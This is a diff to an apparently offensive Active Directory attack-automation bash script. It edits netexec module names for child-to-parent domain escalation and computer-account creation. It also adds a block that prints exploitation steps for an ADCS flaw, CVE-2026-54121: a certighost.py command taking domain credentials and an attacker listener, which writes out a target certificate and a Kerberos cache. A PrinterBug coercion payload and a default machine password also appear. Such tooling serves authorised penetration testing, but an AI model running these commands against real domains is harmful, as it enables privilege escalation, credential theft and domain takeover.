@@ -3251,7 +3251,7 @@ raise_child() {
     else
         echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
         run_command "${impacket_raiseChild} ${argument_imp} -w ${Credentials_dir}/raiseChild_ccache_${user_var}.txt" 2>&1 | tee -a "${Kerberos_dir}/impacket_raiseChild_output.txt"
-        #run_command "${netexec} ${ne_verbose} ldap ${domain} ${argument_ne} --raisechild --log ${Kerberos_dir}/netexec_raiseChild_output.txt"
+        #run_command "${netexec} ${ne_verbose} ldap ${domain} ${argument_ne} -M raisechild --log ${Kerberos_dir}/netexec_raiseChild_output.txt"
     fi
     echo -e ""
 }
@@ -3832,6 +3832,13 @@ netexec_enum_cve() {
         echo -e "${netexec} ${ne_verbose} smb [ TARGET ] ${argument_ne} -M coerce_plus -o M=PrinterBug L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
     fi
     echo -e ""
+    if grep -q "CVE-2026-54121" "${Vulnerabilities_dir}/ne_enum_cve_output_${dc_domain}.txt"; then
+        ne_adcs_enum
+        echo -e "${GREEN}[+] ADCS potentially vulnerable to CVE-2026-54121 (https://github.com/aniqfakhrul/CVE-2026-54121). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2026_54121_exploitation_steps_${dc_domain}.txt"
+        echo -e "sudo python3 certighost.py -d ${domain} -u ${user} -p ${password} --dc-ip ${dc_ip} [--ca-ip ${pki_servers}] [--ca ${pki_cas}] --listener ${attacker_IP} [--target-san ACCOUNT$] [--template User] [--computer-name COMPUTER_NAME] [--computer-pass COMPUTER_PASS | --computer-hash COMPUTER_HASH]" | tee -a "${Vulnerabilities_dir}/CVE_2026_54121_exploitation_steps_${dc_domain}.txt"
+        echo -e "Successful execution writes the target certificate (.pfx) and Kerberos cache (.ccache) to the current directory." | tee -a "${Vulnerabilities_dir}/CVE_2026_54121_exploitation_steps_${dc_domain}.txt"
+    fi
+    echo -e ""
 }
 
 
@@ -4060,7 +4067,7 @@ add_computer() {
             if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
             echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
-            #run_command "${netexec} ${ne_verbose} smb ${dc_ip} ${argument_ne} -M add_computer -o NAME=${host_addcomp} PASSWORD=${pass_addcomp} --log ${Modification_dir}/ne_addcomp_output_${dc_domain}.txt"
+            #run_command "${netexec} ${ne_verbose} smb ${dc_ip} ${argument_ne} -M add-computer -o NAME=${host_addcomp} PASSWORD=${pass_addcomp} --log ${Modification_dir}/ne_addcomp_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
